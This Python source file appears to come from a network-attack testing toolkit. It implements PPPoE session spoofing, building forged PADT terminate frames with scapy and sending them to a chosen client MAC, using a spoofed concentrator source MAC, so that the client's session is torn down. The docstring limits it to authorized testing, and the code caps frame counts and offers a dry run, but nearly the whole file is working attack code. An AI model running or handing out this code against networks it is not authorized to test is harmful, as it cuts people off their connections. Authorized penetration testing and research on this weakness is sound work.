"""PPPoE session spoofing: send a PADT that ends a client's PPPoE session.

A PPPoE session is identified by a session ID that the access concentrator assigns during
discovery. The PADT (PPPoE Active Discovery Terminate, code 0xA7) ends a session, and neither
the PADT nor the session ID is authenticated. A device that knows a client's MAC and the
session ID can send a PADT that looks like it comes from the concentrator, and the client
tears its session down and must start discovery again.

This module sends PADT frames from the operator's port to one client MAC, for one session ID,
with the source MAC the operator chooses (the concentrator's MAC, when it is known). It sends
nothing else: it does not sniff the session, guess IDs or inject session data.

The effect to measure is whether the client ends its session after the PADT, and whether it
logs the source of the PADT.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.ppp import PPPoED
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

ETHERTYPE_PPPOE_DISCOVERY = 0x8863
CODE_PADT = 0xA7
MAX_SESSION_ID = 0xFFFF
MAX_FRAMES = 20
MIN_INTERVAL = 0.1   # seconds


@dataclass(frozen=True)
class PppoeSessionSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the client
    source_mac: str                     # MAC in the PADT's Ethernet source (required)
    client_mac: str                     # the client's MAC, the PADT's destination (required)
    session_id: int                     # the PPPoE session ID to end
    frames: int = 3                     # PADTs to send in total
    interval: float = 0.5               # seconds between PADTs
    dry_run: bool = False               # build PADTs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        normalize_unicast_mac(self.client_mac)
        if not 1 <= self.session_id <= MAX_SESSION_ID:
            raise ValueError(f"Session ID must be between 1 and {MAX_SESSION_ID}.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")
        if self.interval < MIN_INTERVAL:
            raise ValueError(f"Interval must be at least {MIN_INTERVAL} s.")


@dataclass
class PppoeSessionSpoofingStats:
    frames: int = 0
    status: str = ""


def build_padt(source_mac: str, client_mac: str, session_id: int) -> Packet:
    """PADT for one session: Ethernet to the client, PPPoE discovery EtherType, no tags."""
    return (
        Ether(src=normalize_unicast_mac(source_mac), dst=normalize_unicast_mac(client_mac),
              type=ETHERTYPE_PPPOE_DISCOVERY)
        / PPPoED(code=CODE_PADT, sessionid=session_id)
    )


def run_pppoe_session_spoofing(
    config: PppoeSessionSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[PppoeSessionSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> PppoeSessionSpoofingStats:
    """Send `frames` PADTs for the session, one every `interval` seconds."""
    send = send or sendp

    if config.dry_run:
        stats = PppoeSessionSpoofingStats(
            status=(
                f"Dry run: would send {config.frames} PADT(s) to {config.client_mac} from {config.source_mac} "
                f"for session {config.session_id}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    frame = build_padt(config.source_mac, config.client_mac, config.session_id)
    stats = PppoeSessionSpoofingStats()
    for _ in range(config.frames):
        if stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        if stop_event.wait(config.interval):
            break
    return stats
